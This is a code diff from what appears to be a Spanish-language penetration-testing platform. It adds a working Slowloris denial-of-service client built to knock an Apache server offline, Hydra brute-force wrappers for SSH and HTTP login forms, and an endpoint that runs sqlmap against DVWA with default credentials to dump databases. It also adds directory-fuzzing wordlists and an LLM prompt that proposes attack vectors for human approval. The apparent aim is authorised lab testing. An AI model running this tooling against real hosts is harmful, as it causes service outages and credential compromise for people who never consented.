         for (let i = 0; i < 30; i++) {
           await new Promise(r => setTimeout(r, 5000));
-          const resultsRes = await fetch(`http://localhost:8002/api/v1/scan/results/10`,
+          const resultsRes = await fetch(`http://localhost:8002/api/v1/scan/results/${assetId}`,
             { headers: authH(), signal: AbortSignal.timeout(8000) });
           if (resultsRes.ok) {
             const results = await resultsRes.json();
@@ -28922,7 +29238,7 @@ fi
 # Mantener el proceso principal activo
 wait $OLLAMA_PID
 FILE:services\ai_reasoning\prompts\attack_vector_template.py
-ATTACK_VECTOR_SYSTEM_PROMPT = """Eres un Ingeniero de Seguridad Senior especializado en Red Team
+﻿ATTACK_VECTOR_SYSTEM_PROMPT = """Eres un Ingeniero de Seguridad Senior especializado en Red Team
 y operaciones ofensivas, con certificación ENS Alto (RD 311/2022) y más de 10 años de experiencia
 en auditorías técnicas de infraestructura crítica.
 
@@ -28957,7 +29273,7 @@ INSTRUCCIONES DE RAZONAMIENTO:
 1. Analiza qué servicio/CVE representa la mayor superficie de ataque explotable.
 2. Selecciona la técnica de ataque más efectiva según MITRE ATT&CK para ese vector.
 3. Indica la herramienta de validación recomendada (puede ser un módulo auxiliary/scanner,
-  una técnica manual, Nuclei template, Hydra, NetExec u otra herramienta de pentesting).
+   una técnica manual, Nuclei template, Hydra, NetExec u otra herramienta de pentesting).
 4. Evalúa el impacto real sobre confidencialidad, integridad y disponibilidad del activo.
 5. Mapea al artículo ENS Alto más relevante.
 
@@ -28965,23 +29281,23 @@ Responde ÚNICAMENTE con JSON válido, sin texto antes ni después, sin markdown
 
 SCHEMA EXACTO:
 {{
-  "attack_technique": "T1xxx — Nombre MITRE ATT&CK (ej: T1190 — Exploit Public-Facing Application)",
-  "attack_vector": "Descripción técnica del vector en 1 línea (ej: RCE via Apache mod_cgi CVE-2021-41773)",
-  "suggested_tool": "Herramienta recomendada para validación (ej: auxiliary/scanner/http/phpinfo, nuclei -t cves/, hydra -l admin...)",
+  "attack_technique": "T1xxx — Nombre MITRE ATT&CK",
+  "attack_vector": "Descripción técnica del vector en 1 línea",
+  "suggested_tool": "Herramienta recomendada para validación",
   "tool_params": {{
     "target": "IP o rango del activo",
     "port": "puerto objetivo",
-    "extra": "parámetros adicionales relevantes o null"
+    "extra": "parámetros adicionales o null"
   }},
   "alternative_technique": "Técnica alternativa si el vector principal falla, o null",
-  "attack_rationale": "Mínimo 150 palabras. Tres párrafos: (1) relación servicio-vulnerabilidad, (2) por qué esta técnica es la más probable, (3) impacto técnico real sobre el activo",
+  "attack_rationale": "Mínimo 150 palabras. Tres párrafos separados por salto de línea doble:\\n\\n1. Análisis de Superficie: ...\\n\\n2. Vector Crítico: ...\\n\\n3. Evaluación de Riesgo: ...",
   "technical_steps": [
     "Paso 1: reconocimiento específico del servicio",
     "Paso 2: validación de la vulnerabilidad",
     "Paso 3: explotación controlada / proof of concept"
   ],
-  "mitre_tactic": "Táctica MITRE (ej: Initial Access, Lateral Movement, Credential Access)",
-  "ens_article": "Artículo ENS más relevante (ej: op.exp.2, mp.com.1)",
+  "mitre_tactic": "Táctica MITRE",
+  "ens_article": "Artículo ENS más relevante",
   "risk_level": "CRITICAL|HIGH|MEDIUM|LOW",
   "confidence": "alto|medio|bajo",
   "status": "pending_human_approval"
@@ -32200,6 +32516,8 @@ from datetime import datetime
 
 from sqlalchemy.orm import Session
 from sqlalchemy import func
+from sqlalchemy.exc import IntegrityError
+from fastapi import HTTPException
 
 from services.asset_manager.models.asset import (
     Asset,
@@ -32267,8 +32585,14 @@ def create_asset(db: Session, data: AssetCreate, user_id: str, **kwargs) -> Asse
 
     # 2. Creamos el activo en PostgreSQL
     asset = Asset(**asset_data)
-    db.add(asset)
-    db.flush()  # Obtenemos el ID del activo sin cerrar la transacción [cite: 211]
+    try:
+        db.add(asset)
+        db.flush()  # Obtenemos el ID del activo sin cerrar la transacción [cite: 211]
+    except IntegrityError as e:
+        db.rollback()
+        if "ix_assets_ip" in str(e.orig) or "unique" in str(e.orig).lower():
+            raise HTTPException(status_code=409, detail=f"Asset with IP {asset_data.get('ip')} already exists")
+        raise
 
     # 3. Si hay contraseña, la enviamos a Vault
     if password:
@@ -32283,9 +32607,15 @@ def create_asset(db: Session, data: AssetCreate, user_id: str, **kwargs) -> Asse
         reason="Cifrado de credenciales en Vault iniciado"
     )
 
-    db.commit() # Guardamos todo
-    db.refresh(asset)
-    return asset
+    try:
+        db.commit()
+        db.refresh(asset)
+        return asset
+    except IntegrityError as e:
+        db.rollback()
+        if "ix_assets_ip" in str(e.orig) or "unique" in str(e.orig).lower():
+            raise HTTPException(status_code=409, detail=f"Asset with IP {asset_data.get('ip')} already exists")
+        raise
 
 def get_asset(db: Session, asset_id: int, include_deleted: bool = False) -> Optional[Asset]:
     """Get a single asset by ID."""
@@ -34847,6 +35177,171 @@ def get_executor():
     if _executor is None:
         _executor = ExploitExecutor()
     return _executor
+FILE:services\exploit_engine\gobuster_client.py
+"""
+GobusterClient — enumeración de directorios/subdominios web
+Ejecuta gobuster como subprocess en el contenedor Docker.
+"""
+
+import subprocess
+import logging
+import os
+import re
+from datetime import datetime
+from typing import Dict, Optional, List
+
+logger = logging.getLogger("GobusterClient")
+
+DEFAULT_WORDLIST = os.getenv("GOBUSTER_WORDLIST", "/usr/share/wordlists/rockyou.txt")
+GOBUSTER_THREADS = int(os.getenv("GOBUSTER_THREADS", "10"))
+GOBUSTER_TIMEOUT = int(os.getenv("GOBUSTER_TIMEOUT", "300"))
+
+def _run_gobuster(cmd: list, timeout: int) -> tuple[bool, str]:
+    try:
+        result = subprocess.run(
+            cmd,
+            capture_output=True,
+            text=True,
+            timeout=timeout
+        )
+        full_output = result.stdout + result.stderr
+        logger.debug(f"[Gobuster output]\n{full_output}")
+        return result.returncode == 0, full_output
+    except subprocess.TimeoutExpired:
+        return False, f"[TIMEOUT] gobuster no respondió en {timeout}s"
+    except FileNotFoundError:
+        return False, "[ERROR] gobuster no encontrado — verificar Dockerfile.m4"
+    except Exception as e:
+        return False, f"[ERROR] {str(e)}"
+
+class GobusterClient:
+
+    def __init__(self):
+        self.threads = GOBUSTER_THREADS
+        self.timeout = GOBUSTER_TIMEOUT
+        self.wordlist = DEFAULT_WORDLIST
+        logger.info("GobusterClient iniciado (modo local Docker)")
+
+    def enum_dirs(
+        self,
+        target_url: str,
+        wordlist: str = None,
+        extensions: str = "php,html,txt,js,json",
+        skip_ssl_verify: bool = False,
+    ) -> Dict:
+        """Enumera directorios y ficheros en una URL."""
+        wl = wordlist or self.wordlist
+        started_at = datetime.now()
+        logger.info(f"📂 Enumerando directorios: {target_url}")
+
+        import tempfile, os as _os
+        tmp = tempfile.mktemp(suffix=".txt")
+        cmd = [
+            "gobuster", "dir",
+            "-u", target_url,
+            "-w", wl,
+            "-t", str(self.threads),
+            "-x", extensions,
+            "--no-color",
+            "-q",
+            "-o", tmp,
+            *(["-k"] if skip_ssl_verify else []),
+        ]
+
+        ok, output = _run_gobuster(cmd, self.timeout)
+        if _os.path.exists(tmp):
+            with open(tmp) as f:
+                output = f.read()
+            _os.remove(tmp)
+        duration = int((datetime.now() - started_at).total_seconds())
+        findings = self._parse_dir_output(output)
+
+        return {
+            "success": len(findings) > 0,
+            "target": target_url,
+            "service": "gobuster_dir",
+            "findings": findings,
+            "attempts": self._count_attempts(output),
+            "duration": duration,
+            "output": output,
+            "error": None if ok else output,
+        }
+
+    def enum_subdomains(
+        self,
+        domain: str,
+        wordlist: str = None,
+    ) -> Dict:
+        """Enumera subdominios de un dominio."""
+        wl = wordlist or self.wordlist
+        started_at = datetime.now()
+        logger.info(f"🌐 Enumerando subdominios: {domain}")
+
+        import tempfile, os as _os
+        tmp = tempfile.mktemp(suffix=".txt")
+        cmd = [
+            "gobuster", "dns",
+            "-d", domain,
+            "-w", wl,
+            "-t", str(self.threads),
+            "--no-color",
+            "-q",
+            "-o", tmp,
+        ]
+
+        ok, output = _run_gobuster(cmd, self.timeout)
+        if _os.path.exists(tmp):
+            with open(tmp) as f:
+                output = f.read()
+            _os.remove(tmp)
+        duration = int((datetime.now() - started_at).total_seconds())
+        findings = self._parse_dns_output(output)
+
+        return {
+            "success": len(findings) > 0,
+            "target": domain,
+            "service": "gobuster_dns",
+            "findings": findings,
+            "attempts": self._count_attempts(output),
+            "duration": duration,
+            "output": output,
+            "error": None if ok else output,
+        }
+
+    def _parse_dir_output(self, output: str) -> List[str]:
+        """Extrae rutas encontradas del output de gobuster dir."""
+        findings = []
+        for line in output.splitlines():
+            line = line.strip()
+            match = re.search(r'(/\S*)\s+\(Status:\s*(\d+)\)', line)
+            if match:
+                path, status = match.group(1), match.group(2)
+                if status in ('200', '301', '302', '403'):
+                    findings.append(f"{path} [{status}]")
+        return findings
+
+    def _parse_dns_output(self, output: str) -> List[str]:
+        """Extrae subdominios encontrados del output de gobuster dns."""
+        findings = []
+        for line in output.splitlines():
+            match = re.match(r'^Found:\s+(\S+)', line.strip())
+            if match:
+                findings.append(match.group(1))
+        return findings
+
+    def _count_attempts(self, output: str) -> int:
+        match = re.search(r'Progress:\s+(\d+)', output)
+        if match:
+            return int(match.group(1))
+        return len(output.splitlines())
+
+_gobuster_client = None
+
+def get_gobuster_client() -> GobusterClient:
+    global _gobuster_client
+    if _gobuster_client is None:
+        _gobuster_client = GobusterClient()
+    return _gobuster_client
 FILE:services\exploit_engine\hydra_client.py
 """
 HydraClient — ejecución local (Docker nativo)
@@ -34879,7 +35374,9 @@ def _run_hydra(cmd: list, timeout: int) -> tuple[bool, str]:
             text=True,
             timeout=timeout
         )
-        return result.returncode == 0, result.stdout + result.stderr
+        full_output = result.stdout + result.stderr
+        logger.info(f"HYDRA_OUTPUT: {full_output[:600]}")
+        return result.returncode == 0, full_output
     except subprocess.TimeoutExpired:
         return False, f"[TIMEOUT] hydra no respondió en {timeout}s"
     except FileNotFoundError:
@@ -34933,6 +35430,8 @@ class HydraClient:
             "-P", wl,
             "-t", str(self.threads),
             "-s", str(target_port),
+            "-W", "3",
+            "-f",
             "-o", f"/tmp/hydra_{target_host}_ssh.txt",
             target_host, "ssh"
         ]
@@ -35033,20 +35532,30 @@ class HydraClient:
         target_port: int = 80,
         username: str = "admin",
         wordlist: str = None,
-        path: str = "/"
+        path: str = "/login.php",
+        form_data: str = None,
+        fail_string: str = None,
     ) -> Optional[Dict]:
-        """Cracka HTTP Basic Auth con Hydra local."""
+        """Cracka HTTP POST form con Hydra local (DVWA / bWAPP / Juice Shop)."""
         wl = wordlist or self.wordlist
         started_at = datetime.now()
-        logger.info(f"🌐 Cracking HTTP: {target_host}:{target_port} usuario:{username}")
+        logger.info(f"🌐 Cracking HTTP POST: {target_host}:{target_port} usuario:{username} path:{path}")
+
+        # Formato hydra http-post-form: "path:body:fail_string"
+        form_body = form_data or "username=^USER^&password=^PASS^&Login=Login"
+        fail_str = fail_string or "Login failed"
+        post_spec = f"{path}:{form_body}:{fail_str}"
 
         cmd = [
             "hydra",
             "-l", username,
             "-P", wl,
+            "-s", str(target_port),
             "-t", str(self.threads),
-            f"{target_host}:{target_port}",
-            "http-get", path
+            "-I",
+            target_host,
+            "http-post-form",
+            post_spec,
         ]
 
         ok, output = _run_hydra(cmd, self.timeout)
@@ -35056,7 +35565,7 @@ class HydraClient:
         return {
             "success": password is not None,
             "target": f"{target_host}:{target_port}",
-            "service": "http",
+            "service": "http-post-form",
             "username": username,
             "password": password,
             "attempts": self._count_attempts(output),
@@ -35066,24 +35575,43 @@ class HydraClient:
         }
 
     def _parse_hydra_output(self, output: str) -> Optional[str]:
-        """Parsea output de Hydra para extraer password encontrado."""
-        patterns = [
-            r'\[.*?\]\s+host:\s+.*?\s+login:\s+.*?\s+password:\s+(\S+)',
-            r'password:\s+(\S+)',
-            r'\]\s+(\S+)\s*$'
-        ]
-        for pattern in patterns:
-            match = re.search(pattern, output, re.IGNORECASE | re.MULTILINE)
-            if match:
-                return match.group(1)
+        """Parsea output de Hydra para extraer password encontrado.
+
+        Línea real de Hydra http-post-form:
+          [80][http-post-form] host: 10.202.15.100   login: admin   password: password
+        Línea real de Hydra ssh/ftp:
+          [22][ssh] host: 10.0.0.1   login: root   password: toor
+        """
+        # Patrón principal — cubre ambos formatos (uno o dos grupos de corchetes antes de "host:")
+        match = re.search(
+            r'\[.+?\](?:\[.+?\])?\s+host:\s+\S+\s+login:\s+\S+\s+password:\s+(\S+)',
+            output, re.IGNORECASE | re.MULTILINE
+        )
+        if match:
+            return match.group(1)
+        # Fallback: cualquier "password: <valor>" en la salida
+        match = re.search(r'password:\s+(\S+)', output, re.IGNORECASE)
+        if match:
+            return match.group(1)
         return None
 
     def _count_attempts(self, output: str) -> int:
         """Cuenta intentos en output de Hydra."""
+        # Hydra moderno http: "1 of 1 target completed, 1 valid password found"
+        match = re.search(r'(\d+) of \d+', output, re.IGNORECASE)
+        if match:
+            return int(match.group(1))
+        # Hydra http-post-form: "X login tried" o "X logins tried"
+        match = re.search(r'(\d+)\s+login', output, re.IGNORECASE)
+        if match:
+            return int(match.group(1))
+        # Hydra antiguo: "X tries"
         match = re.search(r'(\d+)\s+tries', output, re.IGNORECASE)
         if match:
             return int(match.group(1))
-        return 0
+        # Fallback: contar líneas con "[ATTEMPT]"
+        attempts = len(re.findall(r'\[ATTEMPT\]', output))
+        return attempts if attempts > 0 else 0
 
 _hydra_client = None
 
@@ -37353,6 +37881,172 @@ def get_monitor(config=None) -> ProductionMonitor:
     elif _monitor is None:
         _monitor = ProductionMonitor()
     return _monitor
+FILE:services\exploit_engine\slowloris_client.py
+"""
+Slowloris DoS client — implementación Python pura sin dependencias externas.
+Abre múltiples conexiones HTTP incompletas para agotar el pool de conexiones de Apache.
+"""
+
+import socket
+import time
+import threading
+import logging
+from typing import Dict
+
+logger = logging.getLogger("SlowlorisClient")
+
+_PARTIAL_HEADER = (
+    "GET / HTTP/1.1\r\n"
+    "Host: {host}\r\n"
+    "User-Agent: Mozilla/5.0\r\n"
+    "Accept-language: en-US,en\r\n"
+    "Connection: keep-alive\r\n"
+)
+
+def _open_socket(host: str, port: int, timeout: float = 4.0) -> socket.socket | None:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(timeout)
+        s.connect((host, port))
+        s.send(_PARTIAL_HEADER.format(host=host).encode())
+        return s
+    except Exception:
+        return None
+
+def _keep_alive(sock: socket.socket) -> bool:
+    try:
+        sock.send(b"X-Keep: x\r\n")
+        return True
+    except Exception:
+        return False
+
+def run_slowloris(
+    host: str,
+    port: int,
+    duration: int = 30,
+    socket_count: int = 150,
+    sleep_time: int = 10,
+) -> Dict:
+    """
+    Ejecuta slowloris durante `duration` segundos.
+
+    Returns:
+        {
+            server_went_down: bool,
+            down_duration_seconds: int,
+            sockets_opened: int,
+            keep_alives_sent: int,
+            output_summary: str,
+        }
+    """
+    started = time.monotonic()
+    deadline = started + duration
+
+    sockets: list[socket.socket] = []
+    server_went_down = False
+    down_start: float | None = None
+    down_duration = 0
+    keep_alives_sent = 0
+    sockets_opened = 0
+
+    logger.info(f"🔥 Slowloris iniciado → {host}:{port} | {socket_count} sockets | {duration}s")
+
+    # Abrir sockets iniciales
+    for _ in range(socket_count):
+        s = _open_socket(host, port)
+        if s:
+            sockets.append(s)
+            sockets_opened += 1
+
+    logger.info(f"📡 {sockets_opened} sockets abiertos")
+
+    while time.monotonic() < deadline:
+        # Enviar keep-alive a todos los sockets activos
+        dead = []
+        for i, s in enumerate(sockets):
+            if not _keep_alive(s):
+                dead.append(i)
+                try:
+                    s.close()
+                except Exception:
+                    pass
+            else:
+                keep_alives_sent += 1
+
+        for i in reversed(dead):
+            sockets.pop(i)
+
+        # Reponer sockets muertos
+        while len(sockets) < socket_count and time.monotonic() < deadline:
+            s = _open_socket(host, port)
+            if s:
+                sockets.append(s)
+                sockets_opened += 1
+            else:
+                break  # servidor no acepta más conexiones
+
+        # Verificar si el servidor responde
+        check_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        check_sock.settimeout(2.0)
+        try:
+            check_sock.connect((host, port))
+            check_sock.close()
+            # Servidor respondió
+            if down_start is not None:
+                # Volvió a funcionar
+                down_duration += int(time.monotonic() - down_start)
+                down_start = None
+                logger.info(f"✅ Servidor volvió a responder")
+        except Exception:
+            # No responde
+            if not server_went_down:
+                server_went_down = True
+                logger.info(f"💥 Servidor caído — Slowloris efectivo")
+            if down_start is None:
+                down_start = time.monotonic()
+        finally:
+            try:
+                check_sock.close()
+            except Exception:
+                pass
+
+        remaining = deadline - time.monotonic()
+        if remaining > 0:
+            time.sleep(min(sleep_time, remaining))
+
+    # Cerrar todos los sockets
+    for s in sockets:
+        try:
+            s.close()
+        except Exception:
+            pass
+
+    if down_start is not None:
+        down_duration += int(time.monotonic() - down_start)
+
+    total_duration = int(time.monotonic() - started)
+
+    if server_went_down:
+        summary = (
+            f"Slowloris efectivo — servidor caído {down_duration}s de {total_duration}s | "
+            f"{sockets_opened} sockets | {keep_alives_sent} keep-alives"
+        )
+    else:
+        summary = (
+            f"Slowloris ejecutado {total_duration}s — servidor resistió | "
+            f"{sockets_opened} sockets | {keep_alives_sent} keep-alives"
+        )
+
+    logger.info(f"🏁 Slowloris terminado: {summary}")
+
+    return {
+        "server_went_down": server_went_down,
+        "down_duration_seconds": down_duration,
+        "sockets_opened": sockets_opened,
+        "keep_alives_sent": keep_alives_sent,
+        "output_summary": summary,
+        "total_duration": total_duration,
+    }
 FILE:services\exploit_engine\sqlmap_executor.py
 """
 SQLMap Executor
@@ -37432,8 +38126,6 @@ class SQLMapExecutor:
             '--timeout=10',
             '--retries=1',
             '--output-dir=/tmp/sqlmap_output',
-            '--forms',
-            '--crawl=1',
             '-v', '0'
         ]
 
@@ -37763,11 +38455,12 @@ async def get_pending_approvals(limit: int = Query(50, ge=1, le=200)):
 
 class ManualAttackSchema(BaseModel):
     target_ip: str
-    attack_type: str  # 'brute_ssh' | 'brute_ftp' | 'brute_http' | 'dos_check'
+    attack_type: str
     username: Optional[str] = 'admin'
     wordlist: Optional[str] = None
     port: Optional[int] = None
     operator: Optional[str] = 'admin@scanops.local'
+    target_host: Optional[str] = None
 
 @router.post("/attack/manual")
 async def manual_attack(req: ManualAttackSchema):
@@ -37782,8 +38475,12 @@ async def manual_attack(req: ManualAttackSchema):
         import psycopg2.extras
         from datetime import datetime as _dt
         from services.exploit_engine.hydra_client import get_hydra_client
+        from services.exploit_engine.gobuster_client import get_gobuster_client
 
-        wordlist = req.wordlist or '/usr/share/wordlists/demo.txt'
+        from services.exploit_engine.hydra_client import DEFAULT_WORDLIST as _DEFAULT_WL
+        from services.exploit_engine.gobuster_client import DEFAULT_WORDLIST as _GOBUSTER_WL
+        wordlist = req.wordlist or _DEFAULT_WL
+        gobuster_wordlist = req.wordlist or _GOBUSTER_WL
         client = get_hydra_client()
         result = {}
         started_at = _dt.utcnow()
@@ -37813,20 +38510,118 @@ async def manual_attack(req: ManualAttackSchema):
                 wordlist=wordlist,
             )
         elif req.attack_type == 'dos_check':
-            import subprocess as _sp
-            cmd = ['timeout', '10', 'curl', '-s', '--max-time', '5',
-                   '--connect-timeout', '3', f'http://{req.target_ip}:{req.port or 80}/']
-            proc = _sp.run(cmd, capture_output=True, text=True)
-            reachable = proc.returncode == 0
+            import httpx as _httpx
+            import time as _time
+            _port = req.port or 80
+            _url = f"http://{req.target_ip}:{_port}/"
+            _t0 = _time.monotonic()
+            try:
+                _r = _httpx.get(_url, timeout=5.0, follow_redirects=True)
+                reachable = True
+                _output = f"Servidor alcanzable — HTTP {_r.status_code} — potencialmente vulnerable a DoS"
+            except Exception as _e:
+                reachable = False
+                _output = f"Servidor no responde — {type(_e).__name__}"
+            _duration = int(_time.monotonic() - _t0)
             result = {
                 'success': reachable,
                 'service': 'http',
-                'target': f"{req.target_ip}:{req.port or 80}",
+                'target': f"{req.target_ip}:{_port}",
                 'attempts': 1,
-                'duration': 5,
+                'duration': _duration,
                 'password': None,
-                'output': 'Servidor alcanzable — potencialmente vulnerable a DoS' if reachable
-                         else 'Servidor no responde',
+                'output': _output,
+            }
+        elif req.attack_type == 'dos_slowloris':
+            from services.exploit_engine.slowloris_client import run_slowloris
+            _port = req.port or 80
+            _res = run_slowloris(
+                host=req.target_ip,
+                port=_port,
+                duration=30,
+                socket_count=150,
+                sleep_time=10,
+            )
+            result = {
+                'success': _res['server_went_down'],
+                'service': 'slowloris',
+                'target': f"{req.target_ip}:{_port}",
+                'attempts': _res['sockets_opened'],
+                'duration': _res['total_duration'],
+                'password': None,
+                'output': _res['output_summary'],
+                'server_went_down': _res['server_went_down'],
+                'down_duration_seconds': _res['down_duration_seconds'],
+                'sockets_opened': _res['sockets_opened'],
+                'keep_alives_sent': _res['keep_alives_sent'],
+            }
+        elif req.attack_type == 'gobuster_dir':
+            port = req.port or 80
+            scheme = 'https' if port == 443 else 'http'
+            host = req.target_host or req.target_ip
+            url = f"{scheme}://{host}:{port}"
+            gobuster = get_gobuster_client()
+            use_ip = not req.target_host or req.target_host == req.target_ip
+            result = gobuster.enum_dirs(
+                target_url=url,
+                wordlist=gobuster_wordlist,
+                skip_ssl_verify=use_ip,
+            )
+        elif req.attack_type == 'gobuster_dns':
+            gobuster = get_gobuster_client()
+            result = gobuster.enum_subdomains(
+                domain=req.target_ip,
+                wordlist=gobuster_wordlist,
+            )
+        elif req.attack_type == 'sqlmap':
+            from services.exploit_engine.sqlmap_executor import get_sqlmap_executor
+            import httpx as _httpx_sq
+            _port = req.port or 80
+            _target_url = (
+                f"http://{req.target_ip}:{_port}/vulnerabilities/sqli/?id=1&Submit=Submit"
+            )
+            # Obtener cookie de sesión válida haciendo login en DVWA (con CSRF token)
+            try:
+                import re as _re
+                _s = _httpx_sq.Client(follow_redirects=True, timeout=5.0)
+                _r_get = _s.get(f"http://{req.target_ip}:{_port}/login.php")
+                _m = _re.search(r"name='user_token'\s+value='([^']+)'", _r_get.text)
+                _user_token = _m.group(1) if _m else ''
+                _s.post(
+                    f"http://{req.target_ip}:{_port}/login.php",
+                    data={"username": "admin", "password": "password",
+                          "Login": "Login", "user_token": _user_token},
+                )
+                _phpsessid = _s.cookies.get("PHPSESSID", "scanops")
+            except Exception:
+                _phpsessid = "scanops"
+            _cookie_str = f"security=low; PHPSESSID={_phpsessid}"
+            _executor = get_sqlmap_executor()
+            _res = _executor.scan(
+                target_url=_target_url,
+                approval_id=0,
+                executor_email=req.operator,
+                ip_origin=req.target_ip,
+                extra_args=[
+                    '--cookie', _cookie_str,
+                    '-p', 'id',
+                    '--dbs',
+                    '--dbms=mysql',
+                    '--level=2',
+                    '--technique=BEUSTQ',
+                ],
+            )
+            result = {
+                'success': _res.get('vulnerable', False),
+                'service': 'sqlmap',
+                'target': _target_url,
+                'attempts': len(_res.get('injections_found', [])),
+                'duration': _res.get('duration', 0),
+                'password': None,
+                'output': _res.get('output', '')[:500],
+                'vulnerable': _res.get('vulnerable', False),
+                'injections_found': _res.get('injections_found', []),
+                'error': _res.get('error'),
             }
         else:
             raise HTTPException(status_code=400, detail=f"Tipo de ataque no soportado: {req.attack_type}")
@@ -37883,7 +38678,17 @@ async def manual_attack(req: ManualAttackSchema):
             "duration": result.get("duration", 0),
             "service": result.get("service", req.attack_type),
             "output_summary": result.get("output", "")[:300],
+            "findings": result.get("findings", []),
             "executed_at": started_at.isoformat(),
+            # slowloris-specific
+            "server_went_down": result.get("server_went_down"),
+            "down_duration_seconds": result.get("down_duration_seconds"),
+            "sockets_opened": result.get("sockets_opened"),
+            # sqlmap-specific
+            "injections_found": result.get("injections_found"),
+            "vulnerable": result.get("vulnerable"),
+            "error": result.get("error"),
+            "target": result.get("target"),
         }
 
     except HTTPException:
@@ -46008,6 +46813,153 @@ from .nikto_client import run_nikto_scan
 from .nuclei_client import NucleiClient
 
 __all__ = ["run_nikto_scan", "NucleiClient"]
+FILE:services\scanner_engine\clients\ffuf_client.py
+"""
+ffuf Client - Directory/Endpoint Fuzzing - Scanner Engine M3
+Busca rutas ocultas, paneles de administración y endpoints no documentados.
+"""
+
+import subprocess
+import json
+import os
+from typing import List, Dict
+
+from shared.scan_logger import ScanLogger
+
+logger = ScanLogger("ffuf_client")
+
+SENSITIVE_PATTERNS = {"admin", "backup", ".env", ".git", "sql", "config", "swagger", "actuator", "phpinfo"}
+
+FALLBACK_WORDLIST = [
+    "admin", "login", "backup", ".env", ".git/HEAD", "wp-admin", "api", "api/v1", "api/v2",
+    "console", "phpmyadmin", "phpinfo.php", "config.php", ".htaccess", "robots.txt",
+    "sitemap.xml", "swagger.json", "openapi.json", "actuator", "actuator/health",
+    "actuator/env", "manager/html", "server-status", "server-info", "test", "debug",
+    "old", "tmp", "upload", "uploads", "files", "static/admin", "admin/config",
+    "backup.zip", "backup.sql", "db.sql", "config.bak", "web.config", "crossdomain.xml",
+]
+
+WORDLIST_PATH = "/usr/share/wordlists/ffuf_web.txt"
+
+def _is_sensitive_path(url: str) -> bool:
+    url_lower = url.lower()
+    return any(p in url_lower for p in SENSITIVE_PATTERNS)
+
+def _assign_severity(status: int, url: str) -> str:
+    if status in (200, 201):
+        return "HIGH" if _is_sensitive_path(url) else "MEDIUM"
+    if status == 403:
+        return "LOW"
+    return "INFO"
+
+REDIRECT_CONSOLIDATION_THRESHOLD = 5
+
+def _consolidate_redirects(findings: List[Dict], target_url: str) -> List[Dict]:
+    redirect_findings = [f for f in findings if f["evidence"]["status"] in (301, 302)]
+    non_redirect_findings = [f for f in findings if f["evidence"]["status"] not in (301, 302)]
+
+    if len(redirect_findings) >= REDIRECT_CONSOLIDATION_THRESHOLD:
+        consolidated = {
+            "title": "Global HTTP Redirect Detected (Possible HTTPS Enforcement)",
+            "severity": "INFO",
+            "description": (
+                f"{len(redirect_findings)} endpoints returned 301/302 redirects. "
+                "The server likely enforces HTTPS globally. "
+                "Run testssl and whatweb against the HTTPS target for full coverage."
+            ),
+            "cve_id": None,
+            "evidence": {
+                "redirect_count": len(redirect_findings),
+                "sample_urls": [f["evidence"]["url"] for f in redirect_findings[:3]],
+                "target": target_url,
+            },
+            "remediation": "Verify HTTPS redirect is enforced with HSTS header (Strict-Transport-Security).",
+            "ens_measure": "op.exp.2",
+            "scanner": "ffuf",
+        }
+        return non_redirect_findings + [consolidated]
+
+    return findings
+
+def _ensure_wordlist() -> str:
+    if os.path.exists(WORDLIST_PATH):
+        return WORDLIST_PATH
+    tmp_wl = f"/tmp/ffuf_wordlist_{os.getpid()}.txt"
+    with open(tmp_wl, "w") as f:
+        f.write("\n".join(FALLBACK_WORDLIST) + "\n")
+    return tmp_wl
+
+def run_ffuf_scan(asset_id: int, target_url: str) -> List[Dict]:
+    logger.info("FFUF_START", target=target_url)
+    output_file = f"/tmp/ffuf_output_{os.getpid()}.json"
+    tmp_wordlist = None
+
+    try:
+        wordlist = _ensure_wordlist()
+        if wordlist != WORDLIST_PATH:
+            tmp_wordlist = wordlist
+
+        cmd = [
+            "ffuf",
+            "-u", f"{target_url}/FUZZ",
+            "-w", wordlist,
+            "-mc", "200,201,204,301,302,403",
+            "-t", "10",
+            "-timeout", "5",
+            "-o", output_file,
+            "-of", "json",
+            "-s",
+        ]
+
+        subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+
+        findings = []
+        if os.path.exists(output_file):
+            with open(output_file, "r") as f:
+                try:
+                    raw = f.read().strip()
+                    if not raw:
+                        logger.warning("FFUF_EMPTY_OUTPUT", target=target_url)
+                        return []
+                    data = json.loads(raw)
+                    results = data.get("results", [])
+                    for r in results:
+                        url = r.get("url", "")
+                        status = r.get("status", 0)
+                        length = r.get("length", 0)
+                        severity = _assign_severity(status, url)
+                        path = url.replace(target_url, "").lstrip("/")
+                        findings.append({
+                            "title": f"Exposed Endpoint: /{path}",
+                            "severity": severity,
+                            "description": f"Endpoint /{path} returned HTTP {status}.",
+                            "cve_id": None,
+                            "evidence": {"url": url, "status": status, "length": length},
+                            "remediation": "Restrict access to this endpoint with authentication, IP whitelisting, or remove if not needed.",
+                            "ens_measure": "op.exp.2",
+                            "scanner": "ffuf",
+                        })
+                except json.JSONDecodeError:
+                    logger.error("FFUF_JSON_ERROR", target=target_url)
+
+        findings = _consolidate_redirects(findings, target_url)
+        logger.info("FFUF_FINISH", target=target_url, count=len(findings))
+        return findings
+
+    except subprocess.TimeoutExpired:
+        logger.error("FFUF_TIMEOUT", target=target_url)
+        return []
+    except FileNotFoundError:
+        logger.error("FFUF_NOT_FOUND", target=target_url)
+        return []
+    except Exception as e:
+        logger.error("FFUF_ERROR", target=target_url, error=str(e))
+        return []
+    finally:
+        if os.path.exists(output_file):
+            os.remove(output_file)
+        if tmp_wordlist and os.path.exists(tmp_wordlist):
+            os.remove(tmp_wordlist)
 FILE:services\scanner_engine\clients\nikto_client.py
 import subprocess
 import json
@@ -46447,11 +47399,11 @@ def run_nmap_scan(asset_id: int, asset_ip: str) -> List[Dict]:
 
     cmd = [
         "nmap",
-        "-sV", "--version-intensity", "7",
+        "-sV", "--version-intensity", "9",
         "--script", "vuln,banner,ssh-hostkey,http-headers,ssl-cert,ssl-enum-ciphers,http-server-header",
         "--script-timeout", "30s",
         "-T4",
-        "-p", "21,22,23,25,80,443,445,3306,3389,8080,8443",
+        "-p", "21,22,23,25,80,443,445,3000,3306,3389,8080,8081,8082,8083,8443,8888,9000",
         "-oX", "-",
         asset_ip
     ]
@@ -46481,6 +47433,14 @@ def run_nmap_scan(asset_id: int, asset_ip: str) -> List[Dict]:
                 service_product = service.attrib.get("product", "") if service is not None else ""
                 extra_info = service.attrib.get("extrainfo", "") if service is not None else ""
                 ostype = service.attrib.get("ostype", "") if service is not None else ""
+
+                # Infer HTTP for ports where nmap fingerprint shows HTTP traffic but service name is generic
